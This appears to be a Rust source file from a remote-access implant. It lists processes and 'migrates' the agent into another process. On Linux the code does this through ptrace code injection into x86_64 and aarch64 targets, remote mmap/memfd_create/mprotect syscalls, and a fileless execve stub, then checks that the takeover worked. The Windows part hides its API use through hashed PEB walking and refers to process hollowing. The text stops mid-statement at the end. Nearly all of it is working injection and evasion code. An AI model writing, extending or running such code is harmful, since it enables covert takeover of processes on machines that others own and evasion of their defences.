//! Process management and load-balancing migration helpers.
//!
//! This module exposes a small, OS-agnostic API for enumerating processes and
//! migrating the agent into a long-running system process.
//!
//! Implementation status by platform:
//! * **Linux:** experimental and x86_64-only; uses ptrace+clone to inject a
//!   staged execve stub.  Returns explicit errors when ptrace prerequisites
//!   are missing (CAP_SYS_PTRACE or same-uid access).
//! * **macOS:** experimental; requires root or the
//!   `com.apple.security.cs.debugger` entitlement and returns explicit errors
//!   when platform prerequisites are not met.
//! * **Windows:** experimental via the shared `hollowing` crate and subject to
//!   target process permissions.
//!
//! Process *enumeration* is fully implemented and tested on all platforms.

use anyhow::Result;
use serde::{Deserialize, Serialize};
use sysinfo::System;

// ── pe_resolve helpers (Windows only) ───────────────────────────────────────
#[cfg(windows)]
use crate::pe_resolve_macros::hash_str_const;

/// Resolve a function pointer from kernel32 via PEB walking (no IAT).
#[cfg(windows)]
unsafe fn pm_resolve_api<T>(fn_hash: u32) -> anyhow::Result<T> {
    let module = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
        .ok_or_else(|| anyhow::anyhow!("kernel32 not found in PEB"))?;
    let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
        .ok_or_else(|| anyhow::anyhow!("API not found (hash 0x{:08X})", fn_hash))?;
    Ok(std::mem::transmute_copy(&addr))
}

// ── kernel32 API hash constants ──────────────────────────────────────────────
#[cfg(windows)]
const HASH_CREATETOOLHELP32SNAPSHOT: u32 = hash_str_const(b"CreateToolhelp32Snapshot\0");
#[cfg(windows)]
const HASH_THREAD32FIRST: u32 = hash_str_const(b"Thread32First\0");
#[cfg(windows)]
const HASH_THREAD32NEXT: u32 = hash_str_const(b"Thread32Next\0");

// ── Function pointer types (kernel32) ────────────────────────────────────────
#[cfg(windows)]
type FnCreateToolhelp32Snapshot = unsafe extern "system" fn(u32, u32) -> *mut std::ffi::c_void;
#[cfg(windows)]
type FnThread32First = unsafe extern "system" fn(
    *mut std::ffi::c_void,
    *mut windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32,
) -> i32;
#[cfg(windows)]
type FnThread32Next = unsafe extern "system" fn(
    *mut std::ffi::c_void,
    *mut windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32,
) -> i32;

// Windows-only process hollowing now lives in the shared `hollowing` crate.

/// A lightweight, serializable view over a process suitable for shipping back
/// to the operator console.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: String,
    pub cpu_usage: f32,
    pub memory_bytes: u64,
}

/// Snapshot the current process table.
pub fn list_processes() -> Vec<ProcessInfo> {
    let mut sys = System::new_all();
    sys.refresh_all();
    sys.processes()
        .iter()
        .map(|(pid, p)| ProcessInfo {
            pid: pid.as_u32(),
            name: p.name().to_string(),
            cpu_usage: p.cpu_usage(),
            memory_bytes: p.memory(),
        })
        .collect()
}

/// Attempt to migrate the running agent into the address space of `target_pid`.
///
/// Write `data` to a remote process at `remote_addr` via `process_vm_writev`,
/// retrying on short writes until the full buffer is transferred or an error
/// occurs.  Returns the total number of bytes written on success or the last
/// OS error on failure.
///
/// `process_vm_writev` may return a positive short count when the kernel
/// cannot transfer the entire buffer in one call (e.g. due to a partial
/// overlap with unmapped pages).  The caller must not treat a short write as
/// success — doing so would execute a truncated ELF or stub in the target.
#[cfg(target_os = "linux")]
fn writev_all(
    pid: libc::pid_t,
    data: &[u8],
    remote_addr: u64,
) -> std::result::Result<usize, std::io::Error> {
    let mut offset: usize = 0;
    let total = data.len();
    while offset < total {
        let local_iov = libc::iovec {
            iov_base: data[offset..].as_ptr() as *mut _,
            iov_len: data.len() - offset,
        };
        let remote_iov = libc::iovec {
            iov_base: (remote_addr as usize + offset) as *mut _,
            iov_len: data.len() - offset,
        };
        let n = unsafe {
            libc::process_vm_writev(pid, &local_iov, 1, &remote_iov, 1, 0)
        };
        if n < 0 {
            return Err(std::io::Error::last_os_error());
        }
        if n == 0 {
            return Err(std::io::Error::new(
                std::io::ErrorKind::WriteZero,
                "process_vm_writev returned 0 bytes written",
            ));
        }
        offset += n as usize;
    }
    Ok(offset)
}

/// The Linux implementation performs a real migration workflow using
/// `ptrace(PTRACE_ATTACH)` and `process_vm_writev`, then verifies takeover
/// before reporting success. Windows and macOS provide platform-specific
/// implementations later in this file.
#[cfg(target_os = "linux")]
pub fn migrate_to_process(target_pid: u32) -> Result<()> {
    tracing::info!("MigrateAgent invoked for Linux pid {target_pid}");

    if target_pid == 0 || target_pid as i32 == unsafe { libc::getpid() } {
        anyhow::bail!("invalid migration target (self or pid 0)");
    }

    {
        // Verify we have ptrace capability or same-uid access.
        // On Linux, ptrace is permitted when any of the following hold:
        //   (a) we are root (uid 0)
        //   (b) the target process has the same UID as ours
        //   (c) we hold CAP_SYS_PTRACE in the target's user namespace
        // Previously this code only checked (a) and (b), rejecting
        // non-root cross-UID targets even when CAP_SYS_PTRACE was present.
        let target_uid_path = format!("/proc/{target_pid}/status");
        let target_status = std::fs::read_to_string(&target_uid_path)
            .map_err(|e| anyhow::anyhow!("cannot read /proc/{target_pid}/status: {e}"))?;
        let target_uid = target_status
            .lines()
            .find(|l| l.starts_with("Uid:"))
            .and_then(|l| l.split_whitespace().nth(1))
            .and_then(|s| s.parse::<u32>().ok())
            .ok_or_else(|| anyhow::anyhow!("could not parse Uid from /proc/{target_pid}/status"))?;
        let our_uid = unsafe { libc::getuid() };

        /// Check whether the current process holds CAP_SYS_PTRACE in its
        /// user namespace by reading `/proc/self/status` CapEff.
        fn has_cap_sys_ptrace() -> bool {
            // CAP_SYS_PTRACE is bit 19 in the capability bitmask.
            const CAP_SYS_PTRACE_BIT: u64 = 1 << 19;
            let Ok(self_status) = std::fs::read_to_string("/proc/self/status") else {
                return false;
            };
            let Some(cap_eff_line) = self_status
                .lines()
                .find(|l| l.starts_with("CapEff:"))
            else {
                return false;
            };
            cap_eff_line
                .split_whitespace()
                .nth(1)
                .and_then(|hex| u64::from_str_radix(hex, 16).ok())
                .map_or(false, |bits| bits & CAP_SYS_PTRACE_BIT != 0)
        }

        if our_uid != 0 && our_uid != target_uid && !has_cap_sys_ptrace() {
            anyhow::bail!(
                "process migration requires CAP_SYS_PTRACE or same-uid access \
                 (our uid={our_uid}, target uid={target_uid}, CAP_SYS_PTRACE not held)"
            );
        }

        unsafe {
            use std::mem::MaybeUninit;

            // ── Stage 1: Attach ───────────────────────────────────────────────
            if libc::ptrace(
                libc::PTRACE_ATTACH,
                target_pid as libc::pid_t,
                0usize,
                0usize,
            ) != 0
            {
                anyhow::bail!(
                    "PTRACE_ATTACH(pid={target_pid}) failed: {}",
                    std::io::Error::last_os_error()
                );
            }
            let mut wstatus: libc::c_int = 0;
            libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
            if !libc::WIFSTOPPED(wstatus) {
                libc::ptrace(
                    libc::PTRACE_DETACH,
                    target_pid as libc::pid_t,
                    0usize,
                    0usize,
                );
                anyhow::bail!(
                    "PTRACE_ATTACH: process did not stop as expected (wstatus={wstatus:#x})"
                );
            }

            // ── Stage 2: Save registers ───────────────────────────────────────
            #[cfg(target_arch = "x86_64")]
            let mut regs: libc::user_regs_struct = MaybeUninit::zeroed().assume_init();
            #[cfg(target_arch = "x86_64")]
            if libc::ptrace(
                libc::PTRACE_GETREGS,
                target_pid as libc::pid_t,
                0usize,
                &mut regs as *mut _ as usize,
            ) != 0
            {
                libc::ptrace(
                    libc::PTRACE_DETACH,
                    target_pid as libc::pid_t,
                    0usize,
                    0usize,
                );
                anyhow::bail!("PTRACE_GETREGS failed: {}", std::io::Error::last_os_error());
            }

            // ── Stage 3: Inject mmap syscall to allocate RW memory ───────────
            // We overwrite bytes at the current RIP with a `syscall; int3` sequence
            // to trigger a mmap(NULL, size, PROT_READ|PROT_WRITE,
            //                      MAP_PRIVATE|MAP_ANON, -1, 0)  (SYS_mmap = 9 on x86_64)
            // then singlestep and read RAX for the new mapping address.

            // ── Stage 2.5: Read agent binary into memory (no disk artifact) ───
            // We use memfd_create to hold the binary in an anonymous in-memory
            // file descriptor, then execve from /proc/self/fd/<n>.  No temporary
            // file is written to disk.
            let agent_path = std::env::current_exe()
                .map_err(|e| anyhow::anyhow!("current_exe() failed: {e}"))?;
            let agent_binary = std::fs::read(&agent_path).map_err(|e| {
                anyhow::anyhow!("failed to read agent binary {}: {e}", agent_path.display())
            })?;
            tracing::info!(
                "read agent binary ({} bytes) for memfd migration to pid {}",
                agent_binary.len(),
                target_pid
            );

            #[cfg(target_arch = "x86_64")]
            {
                // Save original 8 bytes at RIP so we can restore them.
                let orig_rip = regs.rip as usize;
                let orig_word = libc::ptrace(
                    libc::PTRACE_PEEKDATA,
                    target_pid as libc::pid_t,
                    orig_rip as *const libc::c_void,
                    std::ptr::null::<libc::c_void>(),
                );
                // syscall (0F 05) + int3 (CC) + nops to fill 8 bytes
                let inject_word: u64 = 0xcc9090909090050f_u64; // LE: 0F 05 90 90 90 90 90 CC

                // Helper: inject a single syscall, wait for completion, return RAX.
                //
                // Error handling: every ptrace operation and waitpid is checked.
                // Previously several failure modes were silently ignored:
                //   - PTRACE_POKEDATA could fail if the page is not writable
                //   - PTRACE_SETREGS could fail if the tracee exited
                //   - waitpid could return -1 (no child) or a non-stopped status
                //   - PTRACE_GETREGS after the syscall could fail
                // All of these now produce an explicit error.
                let mut run_syscall = |sys: u64,
                                       arg0: u64,
                                       arg1: u64,
                                       arg2: u64,
                                       arg3: u64,
                                       arg4: u64,
                                       arg5: u64|
                 -> Result<u64> {
                    let poke_result = libc::ptrace(
                        libc::PTRACE_POKEDATA,
                        target_pid as libc::pid_t,
                        orig_rip as *mut libc::c_void,
                        inject_word as *mut libc::c_void,
                    );
                    if poke_result == -1 {
                        return Err(anyhow::anyhow!(
                            "run_syscall: PTRACE_POKEDATA failed: {}",
                            std::io::Error::last_os_error()
                        ));
                    }
                    let mut sc_regs = regs;
                    sc_regs.rax = sys;
                    sc_regs.rdi = arg0;
                    sc_regs.rsi = arg1;
                    sc_regs.rdx = arg2;
                    sc_regs.r10 = arg3;
                    sc_regs.r8 = arg4;
                    sc_regs.r9 = arg5;
                    if libc::ptrace(
                        libc::PTRACE_SETREGS,
                        target_pid as libc::pid_t,
                        0usize,
                        &sc_regs as *const _ as usize,
                    ) == -1
                    {
                        return Err(anyhow::anyhow!(
                            "run_syscall: PTRACE_SETREGS failed: {}",
                            std::io::Error::last_os_error()
                        ));
                    }
                    if libc::ptrace(
                        libc::PTRACE_CONT,
                        target_pid as libc::pid_t,
                        0usize,
                        0usize,
                    ) == -1
                    {
                        return Err(anyhow::anyhow!(
                            "run_syscall: PTRACE_CONT failed: {}",
                            std::io::Error::last_os_error()
                        ));
                    }
                    let wp = libc::waitpid(target_pid as libc::pid_t, &mut wstatus, 0);
                    if wp == -1 {
                        return Err(anyhow::anyhow!(
                            "run_syscall: waitpid failed: {}",
                            std::io::Error::last_os_error()
                        ));
                    }
                    if !libc::WIFSTOPPED(wstatus) {
                        return Err(anyhow::anyhow!(
                            "run_syscall: tracee did not stop after syscall \
                             (wstatus={wstatus:#x})"
                        ));
                    }
                    let mut result_regs: libc::user_regs_struct =
                        MaybeUninit::zeroed().assume_init();
                    if libc::ptrace(
                        libc::PTRACE_GETREGS,
                        target_pid as libc::pid_t,
                        0usize,
                        &mut result_regs as *mut _ as usize,
                    ) == -1
                    {
                        return Err(anyhow::anyhow!(
                            "run_syscall: PTRACE_GETREGS failed: {}",
                            std::io::Error::last_os_error()
                        ));
                    }
                    // Restore original bytes at RIP.
                    libc::ptrace(
                        libc::PTRACE_POKEDATA,
                        target_pid as libc::pid_t,
                        orig_rip as *mut libc::c_void,
                        orig_word as *mut libc::c_void,
                    );

                    // Linux syscalls return negative errno values in RAX
                    // (i.e. values in the range -4096..-1).  Treat those as
                    // errors.  The previous code only checked for exactly 0
                    // or u64::MAX, missing all intermediate error codes.
                    let rax = result_regs.rax;
                    let rax_signed = rax as i64;
                    if rax_signed >= -4096 && rax_signed < 0 {
                        let errno = -rax_signed;
                        return Err(anyhow::anyhow!(
                            "run_syscall: remote syscall {sys} returned error {errno} ({})",
                            errno
                        ));
                    }

                    Ok(rax)
                };

                let detach_and_bail = |msg: String| -> Result<()> {
                    libc::ptrace(
                        libc::PTRACE_DETACH,
                        target_pid as libc::pid_t,
                        0usize,
                        0usize,
                    );
                    anyhow::bail!("{msg}");
                };

                // ── Stage 3: mmap RW buffer large enough for the agent binary ──
                const SYS_MMAP: u64 = 9;
                const PROT_RW: u64 = 3; // PROT_READ|PROT_WRITE
                const MAP_PA: u64 = 0x22; // MAP_PRIVATE|MAP_ANON
                let alloc_size = ((agent_binary.len() + 4095) & !4095) as u64;

                let remote_buf = run_syscall(
                    SYS_MMAP,
                    0,          // addr = NULL
                    alloc_size, // length
                    PROT_RW,    // prot
                    MAP_PA,     // flags
                    u64::MAX,   // fd = -1
                    0,          // offset
                )?;
                // run_syscall now returns Err for negative errno values (including
                // MAP_FAILED = -1), so we only need to check for the NULL case.
                if remote_buf == 0 {
                    detach_and_bail(format!("remote mmap failed (returned {remote_buf:#x})"))?;
                    unreachable!()
                }

                // ── Stage 4: Write agent binary to remote buffer via process_vm_writev ──
                // Use writev_all to handle short writes — process_vm_writev may
                // return a positive short count when it cannot transfer the full
                // buffer in one go.
                let written = match writev_all(
                    target_pid as libc::pid_t,
                    &agent_binary,
                    remote_buf,
                ) {
                    Ok(n) => n,
                    Err(e) => {
                        detach_and_bail(format!(
                            "process_vm_writev failed: {e}"
                        ))?;
                        unreachable!()
                    }
                };
                if written != agent_binary.len() {
                    detach_and_bail(format!(
                        "process_vm_writev short write: {written} of {} bytes",
                        agent_binary.len()
                    ))?;
                    unreachable!()
                }

                // ── Stage 4a: memfd_create("", MFD_CLOEXEC) in target ─────────
                // SYS_memfd_create = 319 on x86_64 Linux.
                const SYS_MEMFD_CREATE: u64 = 319;
                const MFD_CLOEXEC: u64 = 1;
                // The name argument is a pointer to an empty string in the target's
                // buffer.  We write a single NUL byte at offset 0 of remote_buf
                // (the beginning of the agent binary which we already copied to the
                // memfd — the kernel doesn't read from this address until memfd_create
                // returns, so it's safe to reuse).  Actually, we need a valid pointer
                // to "".  We use the start of the mmap'd buffer — the first byte of
                // an ELF binary is 0x7f, not NUL.  Instead, we write a NUL byte to
                // a known location using process_vm_writev.
                let nul_byte = [0u8; 1];
                // Place the NUL at alloc_size - 1 (last byte of the mmap'd region).
                let nul_addr = remote_buf as usize + alloc_size as usize - 1;
                if let Err(e) = writev_all(
                    target_pid as libc::pid_t,
                    &nul_byte,
                    nul_addr as u64,
                ) {
                    detach_and_bail(format!("process_vm_writev (nul) failed: {e}"))?;
                    unreachable!()
                }

                let memfd_fd = run_syscall(
                    SYS_MEMFD_CREATE,
                    nul_addr as u64, // name → "" (NUL byte)
                    MFD_CLOEXEC,
                    0,
                    0,
                    0,
                    0,
                )?;
                let memfd_fd = memfd_fd as i32;
                if memfd_fd < 0 {
                    detach_and_bail(format!("remote memfd_create failed (returned {memfd_fd})"))?;
                    unreachable!()
                }

                // ── Stage 4b: write(fd, remote_buf, binary_len) — copy binary to memfd ──
                const SYS_WRITE: u64 = 1;
                let write_result = run_syscall(
                    SYS_WRITE,
                    memfd_fd as u64,           // fd
                    remote_buf,                // buf (agent binary)
                    agent_binary.len() as u64, // count
                    0,
                    0,
                    0,
                )?;
                let bytes_written = write_result as i64;
                if bytes_written < 0 || (bytes_written as usize) != agent_binary.len() {
                    detach_and_bail(format!(
                        "remote write to memfd failed (returned {bytes_written}, expected {})",
                        agent_binary.len()
                    ))?;
                    unreachable!()
                }

                // ── Stage 4c: Build execve stub for /proc/self/fd/<fd> ────────
                let fd_path = format!("/proc/self/fd/{memfd_fd}");
                let payload = build_execve_stub(std::path::Path::new(&fd_path))?;

                // Overwrite beginning of remote_buf with the execve stub
                // (the binary is safely stored in the memfd now).
                // Use writev_all to handle short writes.
                let stub_written = match writev_all(
                    target_pid as libc::pid_t,
                    &payload,
                    remote_buf,
                ) {
                    Ok(n) => n,
                    Err(e) => {
                        detach_and_bail(format!(
                            "process_vm_writev (stub) failed: {e}"
                        ))?;
                        unreachable!()
                    }
                };
                if stub_written != payload.len() {
                    detach_and_bail(format!(
                        "process_vm_writev (stub) short write: {stub_written} of {} bytes",
                        payload.len()
                    ))?;
                    unreachable!()
                }

                // ── Stage 4.5: Transition mapped pages from RW to RX via mprotect ──
                // mprotect only the first page (containing the execve stub); the
                // rest of the mapping is not needed after the write is complete and
                // will be unmapped by the execve.
                const SYS_MPROTECT: u64 = 10;
                const PROT_RX: u64 = 5; // PROT_READ|PROT_EXEC
                let stub_pages = 4096u64; // one page covers the execve stub
                let mprot_result =
                    run_syscall(SYS_MPROTECT, remote_buf, stub_pages, PROT_RX, 0, 0, 0)?;
                if mprot_result != 0 {
                    detach_and_bail(format!(
                        "remote mprotect failed (returned {:#x})",
                        mprot_result
                    ))?;
                    unreachable!()
                }

                // ── Stage 5: Redirect the traced thread to the execve stub ────
                // execve(2) replaces the entire process image including all threads,
                // so no clone is needed.  We simply set RIP to the execve stub and
                // detach; the target resumes at remote_buf and exec-replaces itself
                // with the agent binary from the memfd.
                let mut exec_regs = regs;
                exec_regs.rip = remote_buf;
                libc::ptrace(
                    libc::PTRACE_SETREGS,
                    target_pid as libc::pid_t,
                    0usize,
                    &exec_regs as *const _ as usize,
                );
                libc::ptrace(
                    libc::PTRACE_DETACH,
                    target_pid as libc::pid_t,
                    0usize,
                    0usize,
                );
                tracing::info!(
                    target_pid,
                    remote_buf = remote_buf as usize,
                    memfd_fd,
                    "MigrateAgent: execve stub injected via ptrace+memfd on Linux x86_64"
                );

                // ── Stage 6: Verify takeover ──────────────────────────────────
                // After detaching, the execve stub runs in the target.  We verify
                // the execve succeeded by checking that the target process is still
                // alive and its executable link (/proc/{pid}/exe) has changed to
                // the memfd path.  The previous code returned Ok(()) immediately
                // without any verification, potentially reporting success when the
                // execve failed (e.g. ETXTBSY, ENOMEM, seccomp blocking execve).
                //
                // Give the target a brief window to execute the stub.  The execve
                // itself is near-instantaneous, but scheduling may introduce a
                // small delay, especially under load.
                let verify_deadline = std::time::Instant::now()
                    + std::time::Duration::from_millis(2000);
                let mut takeover_verified = false;

                loop {
                    std::thread::sleep(std::time::Duration::from_millis(100));

                    // Check that the target is still alive.
                    let exe_link = format!("/proc/{target_pid}/exe");
                    match std::fs::read_link(&exe_link) {
                        Ok(target) => {
                            let target_str = target.to_string_lossy();
                            // After a successful execve via /proc/self/fd/<fd>,
                            // the exe link points to the memfd path, which
                            // contains "memfd:" or the original path was replaced.
                            // If it still points to the original binary, the
                            // execve hasn't happened yet (or the target process
                            // image hasn't been replaced).
                            //
                            // A successful migration means the exe link now
                            // references the memfd — it will typically show as
                            // "/memfd:<name> (deleted)" or similar.
                            if target_str.contains("memfd:") {
                                takeover_verified = true;
                                break;
                            }
                            // The exe link might also show our agent path if
                            // the execve replaced it with a file-backed copy.
                            if target_str.contains(&agent_path.to_string_lossy().to_string()) {
                                takeover_verified = true;
                                break;
                            }
                            // If still pointing to the original binary, the
                            // execve may not have executed yet — keep waiting.
                        }
                        Err(e) => {
                            let raw_os = e.raw_os_error().unwrap_or(0);
                            if raw_os == libc::ENOENT {
                                // Process has exited entirely — execve failed
                                // or the process was killed.
                                anyhow::bail!(
                                    "MigrateAgent: target pid {target_pid} exited \
                                     before takeover could be verified — execve likely failed"
                                );
                            }
                            // EACCES or other transient errors — keep trying.
                        }
                    }

                    if std::time::Instant::now() >= verify_deadline {
                        break;
                    }
                }

                if !takeover_verified {
                    anyhow::bail!(
                        "MigrateAgent: takeover verification timed out for pid {target_pid} \
                         — the execve stub may not have executed (seccomp filter? unknown error)"
                    );
                }

                tracing::info!(
                    target_pid,
                    "MigrateAgent: takeover verified — target process image replaced successfully"
                );
            }

            #[cfg(target_arch = "aarch64")]
            {
                // ── ARM64 Linux migration ──────────────────────────────────
                // Same logical flow as the x86_64 path above, but using the
                // ARM64 ptrace ABI:
                //   • PTRACE_GETREGSET / SETREGSET with NT_PRSTATUS for register access
                //   • svc #0 + brk #0 trampoline for remote syscall injection
                //   • aarch64 syscall numbers (x8 = syscall nr, x0-x5 = args)
                use std::mem::MaybeUninit;

                const NT_PRSTATUS: libc::c_int = 1;

                // Syscall numbers for aarch64 Linux.
                const SYS_MMAP: u64 = 222;
                const SYS_WRITE: u64 = 64;
                const SYS_MEMFD_CREATE: u64 = 279;
                const SYS_MPROTECT: u64 = 226;

                // ARM64 instructions: svc #0 ; brk #0  (8 bytes)
                // When written at the current PC this lets us execute a single
                // syscall and trap back to the tracer.
                const TRAMPOLINE: u64 =
                    u64::from_le_bytes([0x01, 0x00, 0x00, 0xD4, 0x00, 0x00, 0x20, 0xD4]);

                // ── Read registers ──────────────────────────────────────────
                let mut regs: libc::user_regs_struct = unsafe { MaybeUninit::zeroed().assume_init() };
                let mut iov = libc::iovec {
                    iov_base: &mut regs as *mut _ as *mut _,
                    iov_len: std::mem::size_of::<libc::user_regs_struct>(),
                };
                if unsafe {
                    libc::ptrace(
                        libc::PTRACE_GETREGSET,
                        target_pid as libc::pid_t,
                        NT_PRSTATUS as usize,
                        &mut iov as *mut _ as usize,
                    )
                } == -1
                {
                    unsafe {
                        libc::ptrace(
                            libc::PTRACE_DETACH,
                            target_pid as libc::pid_t,
                            0usize,
                            0usize,
                        )
                    };
                    anyhow::bail!(
                        "PTRACE_GETREGSET failed: {}",
                        std::io::Error::last_os_error()
                    );
                }
                let orig_pc = regs.pc;

                // Save the 8 bytes at the current PC so we can restore them.
                let orig_word = unsafe {
                    libc::ptrace(
                        libc::PTRACE_PEEKDATA,
                        target_pid as libc::pid_t,
                        orig_pc as *const libc::c_void,
                        std::ptr::null::<libc::c_void>(),
                    )
                };

                // Helper: inject a single syscall, wait for completion, return x0.
                let mut run_syscall = |sys: u64,
                                       arg0: u64,
                                       arg1: u64,
                                       arg2: u64,
                                       arg3: u64,
                                       arg4: u64,
                                       arg5: u64|
                 -> Result<u64> {
                    // Write the trampoline at PC.
                    if unsafe {
                        libc::ptrace(
                            libc::PTRACE_POKEDATA,
                            target_pid as libc::pid_t,
                            orig_pc as *mut libc::c_void,
                            TRAMPOLINE as *mut libc::c_void,
                        )
                    } == -1
                    {
                        return Err(anyhow::anyhow!(
                            "run_syscall: PTRACE_POKEDATA failed: {}",
                            std::io::Error::last_os_error()
                        ));
                    }

                    // Set up registers: x8=syscall, x0-x5=args, PC=orig_pc.
                    let mut sc_regs = regs;
                    sc_regs.regs[8] = sys;
                    sc_regs.regs[0] = arg0;
                    sc_regs.regs[1] = arg1;
                    sc_regs.regs[2] = arg2;
                    sc_regs.regs[3] = arg3;
                    sc_regs.regs[4] = arg4;
                    sc_regs.regs[5] = arg5;
                    sc_regs.pc = orig_pc;

                    let sc_iov = libc::iovec {
                        iov_base: &mut sc_regs as *mut _ as *mut _,
                        iov_len: std::mem::size_of::<libc::user_regs_struct>(),
                    };
                    if unsafe {
                        libc::ptrace(
                            libc::PTRACE_SETREGSET,
                            target_pid as libc::pid_t,
                            NT_PRSTATUS as usize,
                            &sc_iov as *const _ as usize,
                        )
                    } == -1
                    {
                        return Err(anyhow::anyhow!(
                            "run_syscall: PTRACE_SETREGSET failed: {}",
                            std::io::Error::last_os_error()
                        ));
                    }
                    if unsafe {
                        libc::ptrace(
                            libc::PTRACE_CONT,
                            target_pid as libc::pid_t,
                            0usize,
                            0usize,
                        )
                    } == -1
                    {
                        return Err(anyhow::anyhow!(
                            "run_syscall: PTRACE_CONT failed: {}",
                            std::io::Error::last_os_error()
                        ));
                    }
                    let mut wp_status: libc::c_int = 0;
                    let wp = unsafe { libc::waitpid(target_pid as libc::pid_t, &mut wp_status, 0) };
                    if wp == -1 {
                        return Err(anyhow::anyhow!(
                            "run_syscall: waitpid failed: {}",
                            std::io::Error::last_os_error()
                        ));
                    }
                    if !libc::WIFSTOPPED(wp_status) {
                        return Err(anyhow::anyhow!(
                            "run_syscall: tracee did not stop after syscall \
                             (wstatus={wp_status:#x})"
                        ));
                    }

                    // Read back registers for the result.
                    let mut result_regs: libc::user_regs_struct =
                        unsafe { MaybeUninit::zeroed().assume_init() };
                    let mut res_iov = libc::iovec {
                        iov_base: &mut result_regs as *mut _ as *mut _,
                        iov_len: std::mem::size_of::<libc::user_regs_struct>(),
                    };
                    if unsafe {
                        libc::ptrace(
                            libc::PTRACE_GETREGSET,
                            target_pid as libc::pid_t,
                            NT_PRSTATUS as usize,
                            &mut res_iov as *mut _ as usize,
                        )
                    } == -1
                    {
                        return Err(anyhow::anyhow!(
                            "run_syscall: PTRACE_GETREGSET (result) failed: {}",
                            std::io::Error::last_os_error()
                        ));
                    }

                    // Restore original bytes at PC.
                    unsafe {
                        libc::ptrace(
                            libc::PTRACE_POKEDATA,
                            target_pid as libc::pid_t,
                            orig_pc as *mut libc::c_void,
                            orig_word as *mut libc::c_void,
                        )
                    };

                    // Check for Linux syscall errors (negative errno in x0).
                    let x0 = result_regs.regs[0];
                    let x0_signed = x0 as i64;
                    if x0_signed >= -4096 && x0_signed < 0 {
                        let errno = -x0_signed;
                        return Err(anyhow::anyhow!(
                            "run_syscall: remote syscall {sys} returned error {errno}"
                        ));
                    }

                    Ok(x0)
                };

                let detach_and_bail = |msg: String| -> Result<()> {
                    unsafe {
                        libc::ptrace(
                            libc::PTRACE_DETACH,
                            target_pid as libc::pid_t,
                            0usize,
                            0usize,
                        )
                    };
                    anyhow::bail!("{msg}");
                };

                // ── Stage 3: mmap RW buffer ─────────────────────────────────
                const PROT_RW: u64 = 3; // PROT_READ | PROT_WRITE
                const MAP_PA: u64 = 0x22; // MAP_PRIVATE | MAP_ANON
                let alloc_size = ((agent_binary.len() + 4095) & !4095) as u64;

                let remote_buf = run_syscall(
                    SYS_MMAP, 0, alloc_size, PROT_RW, MAP_PA, u64::MAX, 0,
                )?;
                if remote_buf == 0 {
                    detach_and_bail(format!("remote mmap failed (returned {remote_buf:#x})"))?;
                    unreachable!()
                }

                // ── Stage 4: Write agent binary via process_vm_writev ───────
                let written = match writev_all(
                    target_pid as libc::pid_t,
                    &agent_binary,
                    remote_buf,
                ) {
                    Ok(n) => n,
                    Err(e) => {
                        detach_and_bail(format!("process_vm_writev failed: {e}"))?;
                        unreachable!()
                    }
                };
                if written != agent_binary.len() {
                    detach_and_bail(format!(
                        "process_vm_writev short write: {written} of {} bytes",
                        agent_binary.len()
                    ))?;
                    unreachable!()
                }

                // ── Stage 4a: memfd_create("", MFD_CLOEXEC) ────────────────
                const MFD_CLOEXEC: u64 = 1;
                // Write a NUL byte at the end of the mmap region for the name.
                let nul_byte = [0u8; 1];
                let nul_addr = remote_buf as usize + alloc_size as usize - 1;
                if let Err(e) = writev_all(target_pid as libc::pid_t, &nul_byte, nul_addr as u64) {
                    detach_and_bail(format!("process_vm_writev (nul) failed: {e}"))?;
                    unreachable!()
                }

                let memfd_fd = run_syscall(
                    SYS_MEMFD_CREATE, nul_addr as u64, MFD_CLOEXEC, 0, 0, 0, 0,
                )?;
                let memfd_fd = memfd_fd as i32;
                if memfd_fd < 0 {
                    detach_and_bail(format!(
                        "remote memfd_create failed (returned {memfd_fd})"
                    ))?;
                    unreachable!()
                }

                // ── Stage 4b: write(fd, remote_buf, binary_len) ─────────────
                let write_result = run_syscall(
                    SYS_WRITE,
                    memfd_fd as u64,
                    remote_buf,
                    agent_binary.len() as u64,
                    0,
                    0,
                    0,
                )?;
                let bytes_written = write_result as i64;
                if bytes_written < 0 || (bytes_written as usize) != agent_binary.len() {
                    detach_and_bail(format!(
                        "remote write to memfd failed (returned {bytes_written}, expected {})",
                        agent_binary.len()
                    ))?;
                    unreachable!()
                }

                // ── Stage 4c: Build execve stub for /proc/self/fd/<fd> ──────
                let fd_path = format!("/proc/self/fd/{memfd_fd}");
                let payload = build_execve_stub(std::path::Path::new(&fd_path))?;

                // Overwrite beginning of remote_buf with the execve stub.
                let stub_written = match writev_all(
                    target_pid as libc::pid_t,
                    &payload,
                    remote_buf,
                ) {
                    Ok(n) => n,
                    Err(e) => {
                        detach_and_bail(format!(
                            "process_vm_writev (stub) failed: {e}"
                        ))?;
                        unreachable!()
                    }
                };
                if stub_written != payload.len() {
                    detach_and_bail(format!(
                        "process_vm_writev (stub) short write: {stub_written} of {} bytes",
                        payload.len()
                    ))?;
                    unreachable!()
                }

                // ── Stage 4.5: mprotect stub page to RX ─────────────────────
                const PROT_RX: u64 = 5; // PROT_READ | PROT_EXEC
                let stub_pages = 4096u64;
                let mprot_result = run_syscall(
                    SYS_MPROTECT, remote_buf, stub_pages, PROT_RX, 0, 0, 0,
                )?;
                if mprot_result != 0 {
                    detach_and_bail(format!(
                        "remote mprotect failed (returned {:#x})",
                        mprot_result
                    ))?;
                    unreachable!()
                }

                // ── Stage 5: Redirect PC to execve stub and detach ──────────
                let mut exec_regs = regs;
                exec_regs.pc = remote_buf;
                // Clear argument registers for a clean state.
                exec_regs.regs[0] = 0;
                for i in 1..31 {
                    exec_regs.regs[i] = 0;
                }
                let exec_iov = libc::iovec {
                    iov_base: &mut exec_regs as *mut _ as *mut _,
                    iov_len: std::mem::size_of::<libc::user_regs_struct>(),
                };
                unsafe {
                    libc::ptrace(
                        libc::PTRACE_SETREGSET,
                        target_pid as libc::pid_t,
                        NT_PRSTATUS as usize,
                        &exec_iov as *const _ as usize,
                    )
                };
                unsafe {
                    libc::ptrace(
                        libc::PTRACE_DETACH,
                        target_pid as libc::pid_t,
                        0usize,
                        0usize,
                    )
                };
                tracing::info!(
                    target_pid,
                    remote_buf = remote_buf as usize,
                    memfd_fd,
